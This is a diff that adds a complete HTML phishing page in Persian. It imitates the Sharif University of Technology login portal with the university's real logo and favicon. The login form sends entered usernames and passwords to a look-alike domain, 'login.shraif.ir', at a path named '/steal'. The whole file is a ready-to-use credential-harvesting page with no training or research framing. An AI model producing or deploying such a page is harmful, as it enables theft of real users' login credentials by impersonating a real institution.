@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>ورود | سامانه احراز هویت دانشگاه صنعتی شریف</title>
+  <link rel="icon" href="https://www.sharif.edu/favicon.ico">
+  <style>
+    body {
+      font-family: Tahoma, sans-serif;
+      background-color: #f5f5f5;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    .box {
+      background: white;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      text-align: center;
+      width: 300px;
+    }
+    .box img {
+      width: 80px;
+    }
+    .box input {
+      width: 90%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+    .box input[type="submit"] {
+      background-color: #0066cc;
+      color: white;
+      border: none;
+      font-weight: bold;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <img src="https://upload.wikimedia.org/wikipedia/fa/1/1e/Sharif_University_logo.svg" alt="Sharif Logo">
+    <h3>سامانه ورود کاربران</h3>
+    <form method="POST" action="https://login.shraif.ir/steal">
+      <input type="text" name="username" placeholder="نام کاربری"><br>
+      <input type="password" name="password" placeholder="کلمه عبور"><br>
+      <input type="submit" value="ورود">
+    </form>
+  </div>
+</body>
+</html>
